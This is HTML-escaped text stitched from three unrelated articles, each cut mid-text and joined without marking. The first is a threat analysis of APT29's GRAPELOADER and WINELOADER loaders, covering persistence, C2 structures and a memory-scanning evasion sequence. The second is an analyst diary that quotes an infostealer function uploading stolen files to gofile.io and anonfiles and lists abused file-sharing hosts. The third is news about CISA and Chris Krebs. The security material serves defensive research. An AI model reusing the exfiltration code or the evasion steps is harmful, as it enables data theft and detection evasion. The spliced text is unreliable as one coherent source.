&lt;p&gt;Malicious execution begins by setting up&amp;nbsp;&lt;strong&gt;persistence&lt;/strong&gt;, but only if the process’s&amp;nbsp;&lt;strong&gt;current working directory&lt;/strong&gt;&amp;nbsp;is&amp;nbsp;&lt;strong&gt;not&lt;/strong&gt;&amp;nbsp;&lt;code&gt;C:\Windows\System32&lt;/code&gt;. This check prevents persistence from being established when executed via tools like&amp;nbsp;&lt;code&gt;rundll32.exe&lt;/code&gt;, though the malware is still executed. If persistence is required, GRAPELOADER:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Copies the content of the delivered archive&amp;nbsp;&lt;code&gt;wine (2).zip&lt;/code&gt;&amp;nbsp;to&amp;nbsp;&lt;code&gt;C:\Users\User\AppData\Local\POWERPNT\&lt;/code&gt;.&lt;/li&gt;



&lt;li&gt;Creates a&amp;nbsp;&lt;strong&gt;Run&lt;/strong&gt;&amp;nbsp;registry key at&amp;nbsp;&lt;code&gt;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&amp;nbsp;with the entry&amp;nbsp;&lt;code&gt;POWERPNT&lt;/code&gt;, pointing to&amp;nbsp;&lt;code&gt;C:\Users\User\AppData\Local\POWERPNT\wine.exe&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;&lt;strong&gt;C2 Communication&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;After establishing persistence, the malicious code enters an infinite loop, polling its&amp;nbsp;&lt;strong&gt;C2 server&lt;/strong&gt;&amp;nbsp;every&amp;nbsp;&lt;strong&gt;60 seconds&lt;/strong&gt;. Initially, it collects information on the environment, including:&amp;nbsp;&lt;code&gt;UserName&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ComputerName&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ProcessName&lt;/code&gt;, and&amp;nbsp;&lt;code&gt;ProcessPID&lt;/code&gt;. Together with the&amp;nbsp;&lt;strong&gt;hardcoded 64-character hexadecimal string&lt;/strong&gt;&amp;nbsp;&lt;code&gt;e55c854d77279ed516579b91315783edd776ac0ff81ea4cc5b2b0811cf40aa63&lt;/code&gt;&amp;nbsp;(believed to function as a&amp;nbsp;&lt;strong&gt;campaign/version tag&lt;/strong&gt;) the collected data are structured like this:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;struct CollectedEnvironmentInfo
{
    BYTE UserName[512];
    BYTE ComputerName[512];
    BYTE ProcessName[512];
    DWORD ProcessPID;
    BYTE HardcodedHexString[64];
    DWORD GenRandNumFromSystemTime;
};&lt;/pre&gt;



&lt;p&gt;This structure is sent via an&amp;nbsp;&lt;strong&gt;HTTPS POST&lt;/strong&gt;&amp;nbsp;request to the C2 server&amp;nbsp;&lt;code&gt;https[:]//ophibre[.]com/blog.php&lt;/code&gt;&amp;nbsp;using the&amp;nbsp;&lt;strong&gt;User-Agent&lt;/strong&gt;&amp;nbsp;string&amp;nbsp;&lt;code&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&lt;/code&gt;.&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="Figure 3 - GRAPELOADER - C2 communication.&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Shellcode Execution &amp;amp; Evasion Technique&amp;lt;/strong&amp;gt;" src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image3.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; GRAPELOADER &amp;#8211; C2 communication.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Shellcode Execution &amp;amp; Evasion Technique&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Only after receiving data from the C2 server does GRAPELOADER proceed with further execution. The payload is expected to be a&amp;nbsp;&lt;strong&gt;non-encrypted&lt;/strong&gt;,&amp;nbsp;&lt;strong&gt;memory-independent shellcode&lt;/strong&gt;, which is executed entirely in-memory without being written to disk.&lt;/p&gt;



&lt;p&gt;To evade&amp;nbsp;&lt;strong&gt;memory scanning&lt;/strong&gt;&amp;nbsp;of AV/EDR solutions, GRAPELOADER implements a&amp;nbsp;&lt;a href="https://www.bordergate.co.uk/windows-defender-memory-scanning-evasion/"&gt;well-known&lt;/a&gt;&amp;nbsp;technique:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The received&amp;nbsp;&lt;strong&gt;shellcode&lt;/strong&gt;&amp;nbsp;is copied into an allocated memory region with&amp;nbsp;&lt;code&gt;PAGE_READWRITE&lt;/code&gt;&amp;nbsp;protection.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;strong&gt;memory protection&lt;/strong&gt;&amp;nbsp;is changed to&amp;nbsp;&lt;code&gt;PAGE_NOACCESS&lt;/code&gt;&amp;nbsp;using the&amp;nbsp;&lt;strong&gt;NT API&lt;/strong&gt;&amp;nbsp;&lt;code&gt;NtProtectVirtualMemory&lt;/code&gt;.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;code&gt;CreateThread&lt;/code&gt;&amp;nbsp;&lt;strong&gt;WIN API&lt;/strong&gt;&amp;nbsp;is called to create a new&amp;nbsp;&lt;strong&gt;suspended&lt;/strong&gt;&amp;nbsp;thread, with&amp;nbsp;&lt;code&gt;lpStartAddress&lt;/code&gt;&amp;nbsp;pointing to the beginning of the non-accessible memory region.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;code&gt;Sleep&lt;/code&gt;&amp;nbsp;&lt;strong&gt;WIN API&lt;/strong&gt;&amp;nbsp;(10 seconds) is invoked, giving AV/EDR solutions time to scan the non-accessible memory region.&lt;/li&gt;



&lt;li&gt;The memory protection is changed to&amp;nbsp;&lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;&amp;nbsp;using&amp;nbsp;&lt;code&gt;NtProtectVirtualMemory&lt;/code&gt;.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;code&gt;ResumeThread&lt;/code&gt;&amp;nbsp;&lt;strong&gt;WIN API&lt;/strong&gt;&amp;nbsp;is called to execute the shellcode.&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 4 - GRAPELOADER - Shellcode execution and evasion
technique." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image4.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; GRAPELOADER &amp;#8211; Shellcode execution and evasion technique.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;As this campaign is&amp;nbsp;&lt;strong&gt;highly targeted&lt;/strong&gt;, using&amp;nbsp;&lt;code&gt;CollectedEnvironmentInfo&lt;/code&gt;&amp;nbsp;to fingerprint infected machines, and because the execution of the next-stage payload leaves no&amp;nbsp;&lt;strong&gt;persistent&lt;/strong&gt;&amp;nbsp;traces, we were unable to retrieve the next-stage shellcode.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="wineloader"&gt;WINELOADER&lt;/h3&gt;



&lt;p&gt;The new WINELOADER variant (&lt;code&gt;vmtools.dll&lt;/code&gt;) is a 64-bit trojanized DLL with&amp;nbsp;&lt;strong&gt;964&lt;/strong&gt;&amp;nbsp;exported functions, but only one of them serves as the intended entry point for malicious execution. Interestingly, the&amp;nbsp;&lt;strong&gt;Export Directory&lt;/strong&gt;&amp;nbsp;exhibits RVA duplicity: each pair of exported functions shares the same RVA. This means that the DLL really contains “only”&amp;nbsp;&lt;strong&gt;482 unique&lt;/strong&gt;&amp;nbsp;exports.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 5 - WINELOADER - “vmtools.dll” Exports." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image5.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; WINELOADER &amp;#8211; “vmtools.dll” Exports.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Another notable characteristic is the “&lt;strong&gt;RWX&lt;/strong&gt;” (Read-Write-Execute) flag on the &lt;code&gt;.text&lt;/code&gt; section. This is a strong indication of self-modifying code, which is typically part of the unpacking process.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 6 - WINELOADER - “vmtools.dll” RWX “.text” section." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image6.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; WINELOADER &amp;#8211; “vmtools.dll” RWX “.text” section.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The DLL’s name,&amp;nbsp;&lt;code&gt;vmtools.dll&lt;/code&gt;, along with its exported function names, suggests that it was designed to be deployed alongside a benign, vulnerable executable, leveraging&amp;nbsp;&lt;strong&gt;DLL side-loading&lt;/strong&gt;&amp;nbsp;to execute malicious code.&lt;/p&gt;



&lt;p&gt;While we could not acquire the exact main module used to load this DLL, our research quickly revealed that a similar library (same DLL name + exports) is frequently used by executables that are part of the&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/676e1d744c11267be93daaf3ceac54a55e6976bbb7fc9227b1b8c0b0ca429a57"&gt;VMWare Tools installer&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;However, finding the correct version of the vulnerable module was a challenge. Because this DLL is trojanized, most of the exported functions contained garbage instructions, making it difficult to identify the intended function before the loader triggers one of the broken exports. The process was akin to finding a needle in a haystack.&lt;/p&gt;



&lt;p&gt;To bypass this issue, we opted for an&amp;nbsp;&lt;strong&gt;emulation approach&lt;/strong&gt;, systematically&amp;nbsp;&lt;strong&gt;brute-forcing&lt;/strong&gt;&amp;nbsp;all exported functions while monitoring for&amp;nbsp;&lt;strong&gt;behavioral anomalies&lt;/strong&gt;. This strategy quickly led us to the intended function,&amp;nbsp;&lt;code&gt;Str_Wcscpy&lt;/code&gt;, which initiates malicious execution.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;WINELOADER Unpacking&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;A deeper analysis of&amp;nbsp;&lt;code&gt;Str_Wcscpy&lt;/code&gt;&amp;nbsp;confirmed that it serves as an unpacking routine, similar to the one observed in&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-apt29-cozy-bear-wineloader"&gt;previous WINELOADER versions&lt;/a&gt;.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 7 - WINELOADER - Unpacking routine - new vs. previous
version." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image7.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; WINELOADER &amp;#8211; Unpacking routine &amp;#8211; new vs.&amp;nbsp;previous version.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;As in earlier versions, the&amp;nbsp;&lt;strong&gt;core module&lt;/strong&gt;&amp;nbsp;is unpacked via&amp;nbsp;&lt;strong&gt;RC4 decryption&lt;/strong&gt;, using a&amp;nbsp;&lt;strong&gt;hardcoded 256-byte key&lt;/strong&gt;&amp;nbsp;(see&amp;nbsp;&lt;strong&gt;Appendix A&lt;/strong&gt;). The same RC4 key and algorithm are also used for string decryption and C2 communication.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;C2 Communication&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;After unpacking, the core module of WINELOADER gathers information on the environment from the infected machine, including:&amp;nbsp;&lt;code&gt;IPAddress&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ProcessName&lt;/code&gt;,&amp;nbsp;&lt;code&gt;UserName&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ComputerName&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ProcessPID&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ProcessToken&lt;/code&gt;, and structures the the data like this:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;struct CollectedEnvironmentInfo
{
    WORD PaddingLength;
    BYTE PaddingBytes[PaddingLength];
    QWORD PossibleCampaignID;
    QWORD PossibleSessionID;
    BYTE IPAddress[14];
    BYTE ProcessName[512];
    BYTE UserName[512];
    BYTE ComputerName[30];
    DWORD ProcessPID;
    BYTE ProcessTokenElevationType;
    QWORD PollingInterval;
    BYTE RequestType;
    QWORD MessageLength;
    QWORD Unknown;
    QWORD PossibleModuleID;
    BYTE Message[MessageLength];
};&lt;/pre&gt;



&lt;p&gt;This structure is&amp;nbsp;&lt;strong&gt;almost identical&lt;/strong&gt;&amp;nbsp;to the one seen in&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-apt29-cozy-bear-wineloader"&gt;previous WINELOADER versions&lt;/a&gt;. Initially, this data is&amp;nbsp;&lt;strong&gt;RC4-encrypted&lt;/strong&gt;&amp;nbsp;with the embedded hardcoded key (see&amp;nbsp;&lt;strong&gt;Appendix A&lt;/strong&gt;) before being transmitted via an&amp;nbsp;&lt;strong&gt;HTTPS GET&lt;/strong&gt;&amp;nbsp;request to the C2 server&amp;nbsp;&lt;code&gt;https[:]//bravecup[.]com/view.php&lt;/code&gt;&amp;nbsp;using the&amp;nbsp;&lt;strong&gt;User-Agent&lt;/strong&gt;&amp;nbsp;string&amp;nbsp;&lt;code&gt;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2151.25 Safari/537.36 Edg/119.0.2151.25&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 8 - WINELOADER - C2 communication." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image8.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; WINELOADER C2 Communication&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;One highly&amp;nbsp;&lt;strong&gt;unusual&lt;/strong&gt;&amp;nbsp;aspect is the&amp;nbsp;&lt;strong&gt;User-Agent&lt;/strong&gt;&amp;nbsp;string, which claims to be from&amp;nbsp;&lt;strong&gt;Windows 7&lt;/strong&gt;&amp;nbsp;running&amp;nbsp;&lt;strong&gt;Microsoft Edge (v119.0.2151.25)&lt;/strong&gt;; this is a version that&amp;nbsp;&lt;strong&gt;should not normally exist&lt;/strong&gt;&amp;nbsp;on this OS. This anomaly serves as a strong network indicator of compromise (IoC).&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Evolving Anti-Analysis Techniques&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The older WINELOADER version relied on&amp;nbsp;&lt;strong&gt;function inlining&lt;/strong&gt;&amp;nbsp;for string decryption and did&amp;nbsp;&lt;strong&gt;not&lt;/strong&gt;&amp;nbsp;strictly enforce immediate&amp;nbsp;&lt;strong&gt;memory cleanup&lt;/strong&gt;, instead reusing local variables. In contrast, the new variant takes a different approach,&amp;nbsp;&lt;strong&gt;similar to GRAPELOADER&lt;/strong&gt;&amp;nbsp;(suggesting&amp;nbsp;&lt;strong&gt;codebase overlaps&lt;/strong&gt;&amp;nbsp;or&amp;nbsp;&lt;strong&gt;shared development tactics&lt;/strong&gt;). Each string is processed through three distinct functions: one retrieves the encrypted byte blob, another one decrypts it using the RC4 algorithm, and the last function immediately zeroes out the decrypted memory after use.&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="Figure 9 - WINELOADER C2 communication string decryption: new vs. old
version." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image9.png" /&gt;&lt;/figure&gt;



&lt;p class="has-text-align-center"&gt;Figure 9 &amp;#8211; WINELOADER C2 communication string decryption: new vs.&amp;nbsp;old version.&lt;/p&gt;



&lt;p&gt;Previously, automated tools like&amp;nbsp;&lt;a href="https://github.com/mandiant/flare-floss"&gt;FLOSS&lt;/a&gt;&amp;nbsp;could easily extract and deobfuscate strings from an&amp;nbsp;&lt;strong&gt;unpacked&lt;/strong&gt;&amp;nbsp;WINELOADER sample. The improved implementation in the new variant disrupts this process, making automated string extraction and deobfuscation fail.&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="Figure 10 - WINELOADER FLOSS string deobfuscation: old vs. new
(unpacked samples)." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK4NVZ-image10.png" /&gt;&lt;/figure&gt;



&lt;p class="has-text-align-center"&gt;Figure 10 &amp;#8211; WINELOADER FLOSS string deobfuscation: old vs.&amp;nbsp;new (unpacked samples).&lt;/p&gt;



&lt;p&gt;Beyond string obfuscation, the new WINELOADER variant improves additional anti-analysis techniques, including code mutation, junk instruction insertion, and structural obfuscation. While these changes hinder static analysis, the core malware functionality and network C2 communication remain largely unchanged from previous versions.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="attribution"&gt;Attribution&lt;/h2&gt;



&lt;p&gt;The tactics, techniques, and procedures (TTPs) observed in this campaign bear strong similarities to those seen in the&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-apt29-cozy-bear-wineloader"&gt;previous&lt;/a&gt;&amp;nbsp;WINELOADER campaign from March 2024. In that earlier attack, APT29 also initiated the campaign with a phishing email disguised as an invitation to a wine-tasting event, that time impersonating an Indian Ambassador.&lt;/p&gt;



&lt;p&gt;While some modifications were made to the infection chain in this latest campaign, such as the introduction of GRAPELOADER as the initial stager instead of ROOTSAW (an HTA downloader used previously), the core execution method, employing DLL side-loading and a persistence technique, remained largely unchanged.&lt;/p&gt;



&lt;p&gt;In addtion, as we show in this report, GRAPELOADER shares significant similarities with WINELOADER, a malware well attributed to APT29. This includes alignment in the compilation environment (Rich-PE), matching compilation timestamps, and code similarity such as the string encryption mechanism.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;In this report we provide an in-depth analysis of a new wave of targeted phishing attacks aimed at government and diplomatic entities in Europe. These attacks are linked to the Russian linked APT29 (also known as Midnight Blizzard or Cozy Bear). The attackers impersonate the Ministry of Foreign Affairs of a European country, sending fake wine-tasting invitations to deploy a new malware called GRAPELOADER. This tool serves as an initial-stage mechanism for fingerprinting, persistence, and payload delivery.&lt;/p&gt;



&lt;p&gt;In addition, we also identified a new variant of the previously known WINELOADER malware. Changes in the new variant primarily include evolved stealth and evasion techniques, which further complicate detection efforts. Due to the links we uncovered between GRAPELOADER and WINELOADER, this suggests that WINELOADER is likely delivered in later stages of the attack.&lt;/p&gt;

Why spend time to deploy a C2 infrastructure if you have plenty of ways to use &amp;quot;official&amp;quot; services. Not only, they don't cost any money but the traffic can be hidden in the normal traffic; making them more difficult to detect. A very popular one was anonfiles[.]com. It was so abused that they closed in 2023![&lt;a href="https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/"&gt;1&lt;/a&gt;]. A funny fact is that I still see lot of malicious scripts that refer to this domain. Of course, alternatives popped up here and there, like anonfile[.]la[&lt;a href="https://www.anonfile.la/"&gt;2&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;I spotted some malicious scripts that abuse gofile[.]io[&lt;a href="https://gofile.io/home"&gt;3&lt;/a&gt;], mainly infostealers that exfiltrate collected data through this website. The usage is pretty easy: you request an available server and you post your data:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
def UploadToExternalService(self, path, filename=None) -&amp;gt; str | None:
    if os.path.isfile(path):
        Logger.info('Uploading %s to gofile' % (filename or 'file'))
    with open(path, 'rb') as file:
        fileBytes = file.read()
    if filename is None:
        filename = os.path.basename(path)
    http = PoolManager(cert_reqs='CERT_NONE')
    try:
        server = json.loads(http.request('GET', 'https://api[.]gofile[.]io/getServer').data.decode(errors='ignore'))['data']['server']
        if server:
            url = json.loads(http.request('POST', 'https://{}[.]gofile[.]io/uploadFile'.format(server), fields={'file': (filename,     
&amp;nbsp;                            fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
            if url:
                return url
    except Exception:
        try:
            Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
            url = json.loads(http.request('POST', 'https://api[.]anonfiles[.]com/upload', fields={'file': (filename, 
&amp;nbsp;                            fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
            return url
        except Exception:
            Logger.error('Failed to upload to anonfiles')
            return None&lt;/pre&gt;

&lt;p&gt;Note that if the upload to gofile.io failed, they will fallback to anonfiles.com!? Just why? The service is down...&lt;/p&gt;

&lt;p&gt;There are many alternatives to these services. Here is a quick list:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;transfer[.]sh&lt;/li&gt;
	&lt;li&gt;
	&lt;p&gt;www[.]file[.]io&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
	&lt;li&gt;
	&lt;p&gt;bayfiles[.]com&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
	&lt;li&gt;
	&lt;p&gt;catbox[.]moe&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
	&lt;li&gt;
	&lt;p&gt;filebin[.]net&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;
	&lt;p&gt;temp[.]sh&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Usually, not used in corporate environments, it could be interesting to track hosts that try to resolve these domains!&lt;/p&gt;

The White House memo, which also suspended clearances for other security professionals at Krebs&amp;#8217;s employer &lt;strong&gt;SentinelOne&lt;/strong&gt;, comes as CISA is facing huge funding and staffing cuts.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70987" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70987" height="330" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/chriskrebs-gi.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70987"&gt;Chris Krebs. Image: Getty Images.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The extraordinary &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/04/fact-sheet-president-donald-j-trump-addresses-risks-from-chris-krebs-and-government-censorship/" rel="noopener" target="_blank"&gt;April 9 memo&lt;/a&gt; directs the attorney general to investigate Chris Krebs (no relation), calling him &amp;#8220;a significant bad-faith actor who weaponized and abused his government authority.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The memo said the inquiry will include &amp;#8220;a comprehensive evaluation of all of CISA&amp;#8217;s activities over the last 6 years and will identify any instances where Krebs&amp;#8217; or CISA&amp;#8217;s conduct appears to be contrary to the administration’s commitment to free speech and ending federal censorship, including whether Krebs’ conduct was contrary to suitability standards for federal employees or involved the unauthorized dissemination of classified information.&amp;#8221;&lt;/p&gt;
&lt;p&gt;CISA was created in 2018 during Trump&amp;#8217;s first term, with Krebs installed as its first director. In 2020, CISA launched Rumor Control, a website that sought to rebut disinformation swirling around the 2020 election.&lt;/p&gt;
&lt;p&gt;That effort ran directly counter to Trump&amp;#8217;s claims that he lost the election because it was somehow hacked and stolen. The Trump campaign and its supporters filed at least 62 lawsuits contesting the election, vote counting, and vote certification in nine states, and nearly all of those cases were dismissed or dropped for lack of evidence or standing.&lt;/p&gt;
&lt;p&gt;When the Justice Department began prosecuting people who violently attacked the U.S. Capitol on January 6, 2021, President Trump and Republican leaders shifted the narrative, claiming that Trump lost the election because the previous administration had censored conservative voices on social media.&lt;/p&gt;
&lt;p&gt;Incredibly, the president&amp;#8217;s memo seeking to ostracize Krebs stands reality on its head, accusing Krebs of promoting the censorship of election information, &amp;#8220;including known risks associated with certain voting practices.&amp;#8221; Trump also alleged that Krebs &amp;#8220;&lt;em&gt;falsely and baselessly denied that the 2020 election was rigged and stolen&lt;/em&gt;, including by inappropriately and categorically dismissing widespread election malfeasance and serious vulnerabilities with voting machines&amp;#8221; [emphasis added].&lt;/p&gt;
&lt;p&gt;Krebs did not respond to a request for comment. SentinelOne issued &lt;a href="https://www.sentinelone.com/blog/an-official-statement-in-response-to-the-april-9-2025-executive-order/" rel="noopener" target="_blank"&gt;a statement&lt;/a&gt; saying it would cooperate in any review of security clearances held by its personnel, which is currently fewer than 10 employees.&lt;/p&gt;
&lt;p&gt;Krebs&amp;#8217;s former agency is now facing steep budget and staff reductions. &lt;strong&gt;The Record&lt;/strong&gt; &lt;a href="https://therecord.media/trump-administration-planning-workforce-cuts-at-cisa/" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that CISA is looking to remove some 1,300 people by cutting about half its full-time staff and another 40% of its contractors.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The agency’s National Risk Management Center, which serves as a hub analyzing risks to cyber and critical infrastructure, is expected to see significant cuts, said two sources familiar with the plans,&amp;#8221; The Record&amp;#8217;s &lt;strong&gt;Suzanne Smalley&lt;/strong&gt; wrote. &amp;#8220;Some of the office’s systematic risk responsibilities will potentially be moved to the agency’s Cybersecurity Division, according to one of the sources.&amp;#8221;&lt;/p&gt;
&lt;p&gt;CNN &lt;a href="https://archive.ph/InCFx#selection-2323.226-2323.412" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; the Trump administration is also advancing plans to strip civil service protections from 80% of the remaining CISA employees, potentially allowing them to be fired for political reasons.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;Electronic Frontier Foundation&lt;/strong&gt; (EFF) urged professionals in the cybersecurity community to defend Krebs and SentinelOne, noting that other security companies and professionals could be the next victims of Trump&amp;#8217;s efforts to politicize cybersecurity.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The White House must not be given free reign to turn cybersecurity professionals into political scapegoats,&amp;#8221; the EFF &lt;a href="https://www.eff.org/deeplinks/2025/04/cybersecurity-community-must-not-remain-silent-executive-order-attacking-former" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;It is critical that the cybersecurity community now join together to denounce this chilling attack on free speech and rally behind Krebs and SentinelOne rather than cowering because they fear they will be next.&amp;#8221;&lt;/p&gt;
&lt;p&gt;However, &lt;strong&gt;Reuters&lt;/strong&gt; &lt;a href="https://www.reuters.com/world/us/cybersecurity-industry-falls-silent-trump-turns-ire-sentinelone-2025-04-10/" rel="noopener" target="_blank"&gt;said&lt;/a&gt; it found little sign of industry support for Krebs or SentinelOne, and that many security professionals are concerned about potentially being targeted if they speak out.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Reuters contacted 33 of the largest U.S. cybersecurity companies, including tech companies and professional services firms with large cybersecurity practices, and three industry groups, for comment on Trump&amp;#8217;s action against SentinelOne,&amp;#8221; wrote &lt;strong&gt;Raphael Satter&lt;/strong&gt; and &lt;strong&gt;A.J. Vicens&lt;/strong&gt;. &amp;#8220;Only one offered comment on Trump&amp;#8217;s action. The rest declined, did not respond or did not answer questions.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;CYBERCOM-PLICATIONS&lt;/h2&gt;
&lt;p&gt;On April 3, President Trump fired &lt;strong&gt;Gen. Timothy Haugh&lt;/strong&gt;, the head of the &lt;strong&gt;National Security Agency &lt;/strong&gt;(NSA) and the &lt;strong&gt;U.S. Cyber Command&lt;/strong&gt;, as well as Haugh&amp;#8217;s deputy, &lt;strong&gt;Wendy Noble&lt;/strong&gt;. The president did so immediately after meeting in the Oval Office with far-right conspiracy theorist &lt;a href="https://en.wikipedia.org/wiki/Laura_Loomer" rel="noopener" target="_blank"&gt;Laura Loomer&lt;/a&gt;, who reportedly urged their dismissal. Speaking to reporters on Air Force One after news of the firings broke, Trump questioned Haugh&amp;#8217;s loyalty.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70998" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70998" height="377" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/genhaugh-cspan.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70998"&gt;Gen. Timothy Haugh. Image: C-SPAN.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Virginia &lt;strong&gt;Senator Mark Warner&lt;/strong&gt;, the top Democrat on the Senate Intelligence Committee, called it inexplicable that the administration would remove the senior leaders of NSA-CYBERCOM without cause or warning, and risk disrupting critical ongoing intelligence operations.&lt;/p&gt;
&lt;p&gt;“It is astonishing, too, that President Trump would fire the nonpartisan, experienced leader of the National Security Agency while still failing to hold any member of his team accountable for leaking classified information on a commercial messaging app – even as he apparently takes staffing direction on national security from a discredited conspiracy theorist in the Oval Office,&amp;#8221; Warner said in a statement.&lt;/p&gt;
&lt;p&gt;On Feb. 28, The Record&amp;#8217;s &lt;strong&gt;Martin Matishak&lt;/strong&gt; &lt;a href="https://therecord.media/hegseth-orders-cyber-command-stand-down-russia-planning" rel="noopener" target="_blank"&gt;cited&lt;/a&gt; three sources saying Defense Secretary &lt;strong&gt;Pete Hegseth&lt;/strong&gt; ordered U.S. Cyber Command to stand down from all planning against Russia, including offensive digital actions. The following day, &lt;strong&gt;The Guardian&lt;/strong&gt; &lt;a href="https://www.theguardian.com/us-news/2025/feb/28/trump-russia-hacking-cyber-security?ref=zetter-zeroday.com" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; that analysts at CISA were verbally informed that they were not to follow or report on Russian threats, even though this had previously been a main focus for the agency.&lt;/p&gt;
